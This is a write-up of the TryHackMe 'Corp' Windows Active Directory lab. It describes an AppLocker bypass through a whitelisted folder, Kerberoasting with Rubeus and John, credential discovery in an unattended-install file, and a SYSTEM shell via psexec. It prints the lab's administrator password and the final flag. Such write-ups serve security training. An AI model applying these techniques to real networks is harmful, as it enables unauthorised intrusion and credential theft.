---
layout: writeup
name: "Corp"
platform: "TryHackMe"
category: "thm"
difficulty: "Easy"
permalink: /writeups/thm/corp/
os: "TryHackMe"
date: 2025-11-12
pwned: true
---
# Corp - TryHackMe

**Platform:** TryHackMe\
**Difficulty:** Easy\
**IP Address:** `10.201.22.17`

---

## 🧭 Overview

`Corp` is a Windows-based Active Directory lab focused on bypassing AppLocker, performing Kerberoasting, evading antivirus detection, and escalating privileges. The goal is to obtain administrative access and capture the final flag.

---

## 🔍 Enumeration

For this box, credentials and RDP access details were provided, so initial enumeration started with a direct RDP login.

---

## 🚪 Initial Access & Foothold

### 📥 AppLocker Bypass

Navigated to:

```
C:\Windows\System32\spool\drivers\color
```

This folder allows execution of binaries despite AppLocker restrictions.

Uploaded and executed:

- `Rubeus.exe`
- `PowerUp.ps1`

---

## 🔑 Kerberoasting

Executed Rubeus to dump Kerberos service ticket hashes, then cracked the resulting hash with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Gained credentials for a new domain user.

Logged in as the new user over RDP.

---

## ⬆️ Privilege Escalation

### 🔎 Running PowerUp

Used:

```powershell
. .\PowerUp.ps1; Invoke-AllChecks
```

Found stored credentials in:

```
C:\Windows\Panther\Unattend\Unattended.xml
```

Extracted a base64-encoded password, decoded to:

```
administrator / tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
```

### 💻 Admin Shell via psexec

```bash
psexec.py administrator:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T'@$target
```

Obtained SYSTEM shell.

---

## 🏁 Flags

### User Flag

Captured during RDP session.

### Root Flag

Located on Administrator's Desktop:

```
THM{g00d_j0b_SYS4DM1n_M4s73R}
```

---

## 📂 Useful Commands Recap

```bash
# AppLocker bypass folder
C:\Windows\System32\spool\drivers\color

# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# PowerUp
. .\PowerUp.ps1; Invoke-AllChecks

# Decode Base64
base64 -d <<< "<encoded>"

# Admin shell
psexec.py administrator:'password'@$target
```

---

## 🧠 Lessons Learned

- AppLocker bypasses can often be found in whitelisted system directories.
- Rubeus remains a reliable Kerberoasting tool in Windows AD labs.
- Sensitive credentials are frequently stored in unattended installation files.
- Combining enumeration tools like PowerUp with manual checks speeds up privesc.

---

